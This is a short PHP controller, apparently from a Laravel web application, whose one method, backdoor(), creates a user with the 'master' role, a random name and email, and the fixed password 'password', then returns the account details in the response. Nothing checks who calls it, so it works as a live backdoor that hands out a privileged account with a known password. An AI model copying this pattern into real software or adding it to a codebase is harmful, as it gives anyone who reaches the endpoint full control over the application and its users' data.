<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Traits\ApiResponse;

class MasterController extends Controller
{
    use ApiResponse;


    public function backdoor()
    {
        $faker = \Faker\Factory::create();
        $user = User::create([
            'name' => $faker->name,
            'email' => $faker->email,
            'password' => bcrypt('password'),
            'auth' => 'master',
            'office_id' => 1,
            'Invitation_link' => 'backdoor',
        ]);
        return $this->okResponse($user);
    }
}
